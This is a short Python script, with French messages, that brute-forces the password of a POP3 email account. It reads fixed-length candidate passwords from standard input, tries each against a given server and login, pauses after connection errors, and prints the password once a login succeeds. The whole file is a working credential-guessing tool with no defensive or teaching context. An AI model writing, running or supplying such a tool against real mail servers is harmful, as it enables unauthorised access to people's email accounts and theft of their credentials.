#!/usr/bin/python
#-*- encoding:utf-8 -*-

import poplib
import sys
from sys import stdin as i
from sys import argv 
from socket import error
from time import sleep

"""
on utilise le stdin pour l'obtention des mots de passe.
"""

user=argv[1]

if not user:
    print("le premier argument doit etre le login")
    sys.exit(2)

server=argv[2]
if not server:
    print("le deuxieme argument doit etre le serveur")
    sys.exit(2)

taille=int(argv[3])
if not taille:
    print("le troisieme argument doit etre la taille du mot de passe")
    sys.exit(2)

position=0
debut=0

if(len(argv)>4):
    debut=int(argv[4])
    print('commencement à %d' % (debut))
    
def c(position):
    p=i.read(taille)

    while(p):
        if(position>=debut):
            try:
                M = poplib.POP3(server)
                M.set_debuglevel(0)
                M.user(user)
                print('tentative avec %s en %d' % (p, position))
                try:
                    print(M.pass_(p))
                    print('le mot de passe est ' + p)
                    sys.exit(0)
                    return
                except Exception as e:
                    print(e)
                    pass
                finally:
                    M.quit()
            except error as x:
                print(x)
                sleep(60.0)
        p=i.read(taille)
        position = position + 1
    print("Le mot de passe n'est pas trouve")
    sys.exit(3)

c(position)
